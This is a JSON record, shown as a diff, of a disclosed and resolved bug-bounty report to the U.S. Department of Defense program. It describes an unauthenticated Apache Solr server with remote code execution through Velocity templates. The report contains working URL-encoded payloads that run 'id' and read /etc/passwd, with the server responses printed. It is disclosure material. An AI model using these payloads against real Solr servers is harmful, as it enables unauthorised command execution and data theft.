@@ -1,0 +1,118 @@
+{
+  "id": 822002,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84MjIwMDI=",
+  "url": "https://hackerone.com/reports/822002",
+  "title": "Apache solr RCE via velocity template",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "critical",
+  "readable_substate": "Resolved",
+  "created_at": "2020-03-17T03:28:15.042Z",
+  "submitted_at": "2020-03-17T03:28:15.042Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "khizer47",
+    "url": "/khizer47",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/bhnml5mgaicj9ced7n73mnjeq4nl/8774a5031fc14b74dc4404da039040c69df8ed41021007c0c2beb9de489fcf66"
+    },
+    "is_me?": false,
+    "cleared": true,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 16064,
+    "url": "https://hackerone.com/deptofdefense",
+    "handle": "deptofdefense",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "U.S. Dept Of Defense",
+      "twitter_handle": "DC3VDP",
+      "website": "https://bit.ly/3ntULtN",
+      "about": ""
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2021-01-12T21:49:37.443Z",
+  "bug_reporter_agreed_on_going_public_at": "2021-01-12T11:23:15.555Z",
+  "team_member_agreed_on_going_public_at": "2021-01-12T21:49:37.334Z",
+  "comments_closed?": true,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Hi team, \n\nWhile doing some recon i stumbled upon an IP address http://██████/ The IP took me to a Login Page at ████=https%3A%2F%2F██████████████████\n\nas of the URL suggest this system belongs to US gov. \n\nDoing a Port scan reveals that POST ██████████ is Open, A lot of doors open if Solr is exposed outside of a trusted network and without administrative authentication.  and the solar instance was without any authentication http://████:████████/ \n\nRunning a Query http://████████:█████████*:*  Showed data from http://██████.mil/ that's why i decided to report it here \n\n#Query output example: \n\n````\n\n{\n  \"responseHeader\":{\n    \"status\":0,\n    \"QTime\":0,\n    \"params\":{\n      \"q\":\"*:*\",\n      \"_\":\"1584415352129\"}},\n  \"response\":{\"numFound\":858,\"start\":0,\"docs\":[\n      {\n        \"id\":\"http://███████.mil/instance/relations/locationRelLink#UNIT_TIE_███████\",\n        \"type\":[\"http://███.mil/ont/relations#LocationRelLink\"],\n        \"base.has_link_from_geohash_12_ss\":[\"█████████\"],\n        \"base.has_link_to_geohash_12_ss\":[\"█████████\"],\n        \"base.has_metadata|has_metadata_MIDB-gmi_constraint.has_ownr_producer|US-@id_nidx_ss\":[\"http://███.mil/ont/gmiConstraint/OwnrProducer#US\"],\n        \"base.has_metadata|has_metadata_MIDB-base.is_metadata_of-@id_nidx_ss\":[\"http://█████.mil/instance/relations/locationRelLink#UNIT_TIE_█████\"],\n        \"base.link_predicate|located_at-@id_nidx_ss\":[\"http://██████████.mil/ont/relations#located_at\"],\n        \"base.has_metadata|has_metadata_MIDB-@type_nidx_ss\":[\"http://█████████.mil/ont/base#Metadata\"],\n        \"base.has_metadata|has_metadata_MIDB-dc.source_nidx_ss\":[\"MIDB\"],\n        \"base.link_to-@id_nidx_ss\":[\"http://█████████.mil/instance/base/facility#FAC_███\"],\n        \"base.has_metadata|has_metadata_MIDB-@id_nidx_ss\":[\"http://███████.mil/instance/relations/locationRelLink#UNIT_TIE_██████_has_metadata_MIDB\"],\n        \"base.link_from-@id_nidx_ss\":[\"http://█████.mil/instance/organization/unit#UNIT_████\"],\n        \"_version_\":1660996099434872832},\n      {\n        \"id\":\"http://█████████.mil/instance/base/equipment#██████████\",\n        \"type\":[\"http://██████████.mil/ont/base#Equipment\"],\n        \"gmi_constraint.has_oper_status_ss\":[\"OPR\"],\n        \"equipment.has_nomen|has_nomen_Switch-@type_nidx_ss\":[\"http://████.mil/ont/base#DataQuality\"],\n        \"base.has_location|has_location-base.has_location_name_nidx_ss\":[\"CISCO 3750\"],\n        \"base.has_geo_data|has_geo_data-base.has_geo_metadata|has_geo_metadata_MIDB-base.is_metadata_of-@id_nidx_ss\":[\"http://█████████.mil/instance/base/equipment#████████_has_geo_data\"],\n        \"base.has_geo_data|has_geo_data-base.has_metadata|has_metadata_MIDB-@id_nidx_ss\":[\"http://█████████.mil/instance/base/equipment#████_has_geo_data_has_metadata_MIDB\"],\n        \"base.has_metadata|has_metadata_MIDB-dc.source_nidx_ss\":[\"MIDB\"],\n        \"base.has_country_code|has_country_code_US-base.has_quality_value_nidx_ss\":[\"US\"],\n        \"gmi_constraint.has_condition|has_condition_RDY-@id_nidx_ss\":[\"http://█████.mil/instance/base/equipment#██████████_has_condition_RDY\"],\n        \"base.has_geo_data|has_geo_data-@type_nidx_ss\":[\"http://██████████.mil/ont/base#GeoDataQuality\"],\n        \"base.has_country_code_ss\":[\"US\"],\n        \"gmi_constraint.has_condition|has_condition_RDY-base.has_quality_value_nidx_ss\":[\"RDY\"],\n        \"base.has_geo_data|has_geo_data-base.has_geo_metadata|has_geo_metadata_MIDB-@type_nidx_ss\":[\"http://████████.mil/ont/base#GeoMetadata\"],\n        \"equipment.has_nomen|has_nomen_Switch-base.has_metadata|has_metadata_MIDB-dc.source_nidx_ss\":[\"MIDB\"],\n        \"gmi_constraint.has_condition|has_condition_RDY-base.quality_of-@id_nidx_ss\":[\"http://████████.mil/instance/base/equipment#██████████\"],\n        \"gmi_constraint.has_condition_ss\":[\"RDY\"],\n        \"info.has_graphic|has_graphic-@id_nidx_ss\":[\"http://███.mil/instance/base/equipment#██████████_has_graphic\"],\n        \"gmi_constraint.has_condition|has_condition_RDY-base.has_metadata|has_metadata_MIDB-@type_nidx_ss\":[\"http://█████████.mil/ont/base#Metadata\"],\n        \"gmi_constraint.has_oper_status|has_oper_status_OPR-base.has_metadata|has_metadata_MIDB-@id_nidx_ss\":[\"http://███████.mil/instance/base/equipment#███████_has_oper_status_OPR_has_metadata_MIDB\"],\n        \"gmi_constraint.has_oper_status|has_oper_status_OPR-base.quality_of-@id_nidx_ss\":[\"http://██████.mil/instance/base/equipment#████\"],\n        \"gmi_constraint.has_oper_status|has_oper_status_OPR-base.has_quality_value_enum|OPR-@id_nidx_ss\":[\"http://███.mil/ont/gmiConstraint/OperStatus#OPR\"],\n        \"gmi_constraint.has_oper_status|has_oper_status_OPR-base.has_metadata|has_metadata_MIDB-base.is_metadata_of-@id_nidx_ss\":[\"http://█████████.mil/instance/base/equipment#████_has_oper_status_OPR\"],\n        \"base.has_country_code|has_country_code_US-base.has_metadata|has_met\n````\n\nAnd the Solar Instance is Vulnuberal to RCE via via velocity template \n\n#Request: \n\n````\nGET ███1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27id%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end HTTP/1.1\nHost: ██████████:███████\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:74.0) Gecko/20100101 Firefox/74.0\nAccept: application/json, text/plain, */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nX-Requested-With: XMLHttpRequest\nConnection: close\nReferer: http://████████:██████████/solr/\n````\n\n#Response:\n\n```\nHTTP/1.1 200 OK\nConnection: close\nContent-Type: text/html;charset=utf-8\nContent-Length: 51\n\n 0 uid=██████████(solr) gid=████(solr) groups=██████(solr)\n```\n\n███\n\n#Request:\n\n```\nGET █████1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27cat%20/etc/passwd%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end HTTP/1.1\nHost: ██████:█████\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:74.0) Gecko/20100101 Firefox/74.0\nAccept: application/json, text/plain, */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nX-Requested-With: XMLHttpRequest\nConnection: close\nReferer: http://███████:██████/solr/\n```\n\n#Response: \n\n```\nHTTP/1.1 200 OK\nConnection: close\nContent-Type: text/html;charset=utf-8\nContent-Length: 952\n\n 0 root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n_apt:x:100:65534::/nonexistent:/bin/false\nsolr:x:███████:███::/home/solr:\n```\n\n█████████\n\n\nIt is recommended to firewall Solr and enable authentication for all requests.\n\n## Impact\n\nRemote Code Execution",
+  "weakness": {
+    "id": 70,
+    "name": "Code Injection"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 24,
+  "voters": [
+    "tokyoenigma",
+    "exec_iq",
+    "mattberg",
+    "tess",
+    "ayoub0x1",
+    "savitar0x01",
+    "savxiety",
+    "0nlymohammed",
+    "hundredpercent",
+    "demonia",
+    "and 14 more..."
+  ],
+  "severity": {
+    "rating": "critical",
+    "author_type": "Team"
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
